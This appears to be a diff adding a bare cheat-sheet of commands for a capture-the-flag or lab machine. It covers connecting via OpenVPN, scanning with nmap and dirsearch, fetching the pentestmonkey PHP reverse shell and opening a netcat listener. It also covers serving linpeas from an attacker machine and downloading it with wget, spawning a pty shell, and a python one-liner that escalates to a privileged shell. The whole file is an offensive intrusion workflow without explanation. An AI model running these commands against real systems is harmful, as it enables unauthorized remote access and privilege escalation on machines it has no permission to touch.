@@ -1,0 +1,23 @@
+sudo openvpn yourConf
+
+nmap -sV $ip
+
+dirsearch -u $ip
+
+wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
+
+nc -lvnp $port
+
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+sudo python3 -m http.server 80
+
+wget $attackerIP/linpeas.sh
+
+chmod +x linpeas.sh
+
+./linpeas.sh
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
